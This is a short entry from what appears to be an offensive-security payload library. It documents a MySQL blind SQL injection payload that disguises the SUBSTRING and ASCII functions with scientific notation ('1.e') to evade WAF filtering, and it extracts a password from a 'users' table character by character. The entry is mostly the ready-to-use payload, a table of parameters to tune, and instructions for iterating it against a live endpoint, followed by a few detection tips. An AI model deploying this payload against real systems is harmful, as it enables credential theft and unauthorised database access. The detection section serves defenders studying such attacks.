---
type: code
language: sql
verified: true
tags:
  - SQL Injection
  - Blind SQLi
  - Data Exfiltration
  - Scientific Notation
platforms:
  - Web
  - MySQL
validated: true
---

# MySQL-Password-Extraction-using-Scientific-Notation-and-ASCII

## Code

```sql
1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2
```

## Description

This blind SQL injection payload extracts the first character of a password from the 'users' table by comparing its ASCII value (here, to 70 for 'F') using nested scientific notation (1.e) to obfuscate functions like SUBSTRING and ASCII. The OR condition ensures a boolean response for inference, allowing character-by-character reconstruction.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| Position | Index in substring (e.g., replace first '1' after substring with 2 for second character). | 1 |
| ASCII Value | Comparison value (48-122 for alphanumeric); iterate to find matches. | 70 (for 'F') |
| Table/Field | Assumed 'users' and 'password'; adjust if schema differs. | users, password |

## Usage

Inject into an endpoint that returns different responses based on true/false (e.g., page loads vs. errors). Iterate over positions and ASCII values to build the password. Requires knowledge of table structure; use in conjunction with error-based or time-based blind techniques if boolean is unavailable.

## Detection

- Query logs showing repeated SUBSTRING/ASCII calls with numeric obfuscation.
- High volume of similar requests with varying numeric comparisons.
- WAF alerts on nested function usage in inputs.

## Related

- [[procedures/SQL-Injection-Attack-with-WAF-Bypass-using-Scientific-Notation]]
